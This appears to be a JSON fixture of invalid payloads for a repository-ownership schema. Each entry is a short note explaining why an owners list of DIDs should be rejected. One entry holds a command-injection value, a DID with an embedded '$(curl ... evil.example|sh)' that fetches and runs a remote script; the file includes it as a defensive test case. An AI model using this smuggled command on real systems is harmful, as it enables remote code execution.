[
  {
    "note": "A repository always has an owner; `owners` cannot be empty.",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": []
    }
  },
  {
    "note": "Adoption is per repository; a namespace resource is not adoptable.",
    "payload": {
      "resource": "github.com/acme",
      "owners": [
        "did:webvh:QmAliceScid1:acme-vtc.example:alice"
      ]
    }
  },
  {
    "note": "The same owner twice is refused (uniqueItems).",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": [
        "did:webvh:QmAliceScid1:acme-vtc.example:alice",
        "did:webvh:QmAliceScid1:acme-vtc.example:alice"
      ]
    }
  },
  {
    "note": "Owners are DIDs, not forge logins.",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": [
        "alice"
      ]
    }
  },
  {
    "note": "Each of `owners` is a DID in the W3C DID Core syntax, whose method-specific id admits only `A-Z a-z 0-9 . - _ :` and percent-encoded octets. `did:[a-z0-9]+:\\S+` let a command substitution through, and a surface that later quoted the value into a shell command ran it.",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": [
        "did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)"
      ]
    }
  },
  {
    "note": "Each of `owners` is a DID, and a DID has no whitespace in it.",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": [
        "did:web:acme-vtc.example:bob evil"
      ]
    }
  },
  {
    "note": "Each of `owners` is a bare DID naming a party, not a DID URL: a `#` fragment (a verification-method id) is refused, as are a path and a query.",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": [
        "did:key:z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK#z6MkhaXgBZDvotDkL5257faiztiGiC2QtKLGpbnnEGta2doK"
      ]
    }
  },
  {
    "note": "Each of `owners` is a DID, whose method name is lowercase letters and digits only; `did:WebVH:` is not `did:webvh:`, and DIDs are compared by exact string.",
    "payload": {
      "resource": "github.com/acme/widgets",
      "owners": [
        "did:WebVH:QmBobScid2:acme-vtc.example:bob"
      ]
    }
  }
]
